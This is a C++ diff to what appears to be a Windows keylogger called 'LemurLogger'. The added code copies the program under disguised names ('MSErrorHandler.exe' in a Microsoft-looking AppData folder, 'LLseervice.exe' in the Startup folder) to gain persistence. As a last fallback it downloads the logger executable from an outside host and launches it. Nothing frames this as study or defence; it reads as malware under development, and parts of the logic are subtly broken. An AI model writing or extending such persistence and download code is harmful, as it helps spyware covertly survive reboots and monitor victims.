@@ -15,6 +15,7 @@
 #include <tchar.h>
 #include <vector>
 #include <wininet.h>
+#include <sys/stat.h>
 
 #pragma comment(lib, "Urlmon.lib")
 
@@ -162,6 +163,67 @@ namespace IO
 
         return false;
     }
+    inline bool exists_file (const std::string& name) {
+        struct stat buffer;
+        return (stat (name.c_str(), &buffer) == 0);
+    }
+    void startup(LPCTSTR lpApplicationName) {
+        // additional information
+        STARTUPINFO si;
+        PROCESS_INFORMATION pi;
+
+        // set the size of the structures
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+
+        // start the program up
+        CreateProcess(lpApplicationName,   // the path
+                      "2",        // Command line
+                      NULL,           // Process handle not inheritable
+                      NULL,           // Thread handle not inheritable
+                      FALSE,          // Set handle inheritance to FALSE
+                      0,              // No creation flags
+                      NULL,           // Use parent's environment block
+                      NULL,           // Use parent's starting directory
+                      &si,            // Pointer to STARTUPINFO structure
+                      &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
+        );
+        // Close process and thread handles.
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
+    bool copy_File() {
+        std::string appdata_dir(getenv("*APPDATA*"));
+        std::string path = appdata_dir + "\\Microsoft\\Services\\";
+        std::string filename = "MSErrorHandler.exe";
+        std::string fullpath = path + filename;
+        if (IO::exists_file(fullpath)) {
+            std::string path = " C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
+            std::string filename = "LLseervice.exe";
+            std::string fullpath = path + filename;
+        }
+        if (!(IO::copy_w_cmd(path, filename))) {
+            //do copy 2
+            const char *desfile_path = fullpath.c_str();
+            if (!(IO::ms_Copyfile(desfile_path))) {
+                //do copy 3
+                if (!(IO::copy(path, filename))) {
+                    //do copy 4
+                    std::string url = "www.arekor.co/content/images/LemurLogger.exe";
+                    if (!(IO::download_File(url.c_str(), path.c_str()))) {
+
+                        return false;
+                    }
+                }
+            }
+        } else {
+            startup(fullpath.c_str());
+            return true;
+        }
+    }
+
+
 }
 
 
